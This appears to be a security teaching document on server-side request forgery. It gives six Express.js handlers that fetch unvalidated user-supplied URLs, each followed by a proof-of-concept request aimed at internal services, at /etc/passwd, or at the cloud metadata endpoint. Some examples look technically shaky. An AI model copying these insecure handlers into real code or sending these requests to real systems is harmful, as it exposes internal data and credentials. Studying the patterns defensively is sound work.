### 1. **Using URL from Parameter Without Validation**

#### **Code Example:**

```javascript
// Fetching data from the given URL parameter
app.get('/fetch', (req, res) => {
    const url = req.query.url; // Get the URL from the query parameter
    fetch(url) // Make an HTTP request to the specified URL
        .then(response => response.text())
        .then(data => res.send(data))
        .catch(error => res.status(500).send(error.message));
});
```

#### **PoC:**

An attacker can call the endpoint with an unsafe URL:

```
http://example.com/fetch?url=http://internal-service.local/private-data
```

### 2. **Reading Local Files Using URL**

#### **Code Example:**

```javascript
// Fetching content from a local file based on the provided URL
app.get('/file', (req, res) => {
    const filePath = req.query.path; // Get the file path from the query parameter
    fetch(`file://${filePath}`) // Make a request to the local file
        .then(response => response.text())
        .then(data => res.send(data))
        .catch(error => res.status(500).send(error.message));
});
```

#### **PoC:**

An attacker can access local system files:

```
http://example.com/file?path=/etc/passwd
```

### 3. **Fetching Data from Internal API**

#### **Code Example:**

```javascript
// Fetching data from an API based on the provided URL parameter
app.post('/api/getData', (req, res) => {
    const apiUrl = req.body.url; // Get the URL from the request body
    axios.get(apiUrl) // Use axios to make a request to the URL
        .then(response => res.json(response.data))
        .catch(error => res.status(500).send(error.message));
});
```

#### **PoC:**

An attacker can call the API with a URL pointing to an internal service:

```
http://example.com/api/getData
Body:
{
    "url": "http://internal-api.local/resource"
}
```

### 4. **Calling URL from Service Discovery**

#### **Code Example:**

```javascript
// Calling a URL from service discovery based on the provided parameter
app.get('/discover', (req, res) => {
    const serviceUrl = req.query.service; // Get the service URL from the query parameter
    const targetUrl = `http://service-discovery.local/${serviceUrl}`; // Forming the service URL
    fetch(targetUrl) // Make a request to the service
        .then(response => response.json())
        .then(data => res.json(data))
        .catch(error => res.status(500).send(error.message));
});
```

#### **PoC:**

An attacker can exploit this to access unauthorized services:

```
http://example.com/discover?service=sensitive-data
```

### 5. **Fetching Data from URL Using Proxy**

#### **Code Example:**

```javascript
// Fetching data from a URL using a proxy
app.get('/proxy', (req, res) => {
    const targetUrl = req.query.url; // Get the URL from the query parameter
    http.get(targetUrl, (response) => {
        let data = '';
        response.on('data', chunk => { data += chunk; });
        response.on('end', () => res.send(data));
    }).on('error', (error) => res.status(500).send(error.message));
});
```

#### **PoC:**

An attacker can make a request to an internal URL:

```
http://example.com/proxy?url=http://169.254.169.254/latest/meta-data/
```

### 6. **Fetching URL from Form Input**

#### **HTML Form Code:**

```html
<form action="/get" method="POST">
    <input type="text" name="url" />
    <button type="submit">Get Data</button>
</form>
```

#### **JavaScript Code:**

```javascript
// Fetching data from the URL provided in the form
app.post('/get', (req, res) => {
    const url = req.body.url; // Get the URL from the form input
    fetch(url) // Make a request to that URL
        .then(response => response.text())
        .then(data => res.send(data))
        .catch(error => res.status(500).send(error.message));
});
```

#### **PoC:**

An attacker can input a malicious URL:

```
http://example.com/get
Body:
{
    "url": "http://internal-service.local/data"
}
```
